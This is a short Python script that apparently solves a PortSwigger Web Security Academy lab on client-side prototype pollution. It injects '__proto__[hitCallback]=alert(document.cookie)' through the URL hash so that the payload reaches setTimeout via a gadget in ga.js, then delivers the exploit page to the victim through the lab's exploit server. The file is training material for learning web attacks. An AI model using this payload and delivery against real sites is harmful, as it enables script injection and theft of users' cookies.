from requests import Request

from web_security_academy.core.utils import generate_csrf_html

# https://portswigger.net/research/widespread-prototype-pollution-gadgets

# Source:   `window.location.hash`
# Sink:     `setTimeout` function defined in `/resources/js/ga.js`
# Gadget:   `hitCallback` property


def solve_lab(session):
    req = Request("GET", f"{session.url}#__proto__[hitCallback]=alert(document.cookie)")

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
